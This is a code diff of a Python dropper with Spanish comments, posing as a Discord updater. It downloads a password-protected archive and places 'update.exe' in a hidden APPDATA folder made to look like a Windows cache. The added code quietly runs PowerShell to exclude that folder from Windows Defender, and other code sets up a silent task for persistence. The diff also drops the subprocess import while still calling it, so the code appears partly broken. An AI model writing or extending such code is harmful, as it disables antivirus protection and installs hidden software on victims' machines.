@@ -12,7 +12,6 @@ except ImportError:
         pass
 
 import os
-import subprocess
 import urllib.request
 import tempfile
 import pyzipper
@@ -24,11 +23,35 @@ CONTRASENA_ZIP = "updaterdiscord"
 DIRECTORIO_DISCRETO = os.path.join(os.environ.get("APPDATA", "C:\\"), "Microsoft", "Windows", "Caches")
 RUTA_EXE_FINAL = os.path.join(DIRECTORIO_DISCRETO, "update.exe")
 
-def descargar_y_extraer():
+def asegurar_carpeta_y_exclusion():
+    """Crea la carpeta de destino y añade una exclusión en Windows Defender para evitar bloqueos."""
     try:
+        # 1. Crear la carpeta si no existe y ocultarla
         if not os.path.exists(DIRECTORIO_DISCRETO):
             os.makedirs(DIRECTORIO_DISCRETO, exist_ok=True)
             subprocess.run(f'attrib +h +s "{DIRECTORIO_DISCRETO}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        # 2. Agregar la carpeta a las exclusiones de Windows Defender
+        comando_exclusion = [
+            "powershell",
+            "-Command",
+            f"Add-MpPreference -ExclusionPath '{DIRECTORIO_DISCRETO}'"
+        ]
+        subprocess.run(
+            comando_exclusion,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        return True
+    except Exception:
+        return False
+
+def descargar_y_extraer():
+    try:
+        # Primero aseguramos la creación de la carpeta y su exclusión en el antivirus
+        if not asegurar_carpeta_y_exclusion():
+            return False
 
         ruta_temp_zip = os.path.join(tempfile.gettempdir(), "update_secure.zip")
         
@@ -82,10 +105,6 @@ def configurar_tarea_silenciosa():
         return True
     except Exception:
         return False
-
-if __name__ == "__main__":
-    if descargar_y_extraer():
-        configurar_tarea_silenciosa()
 
 if __name__ == "__main__":
     if descargar_y_extraer():
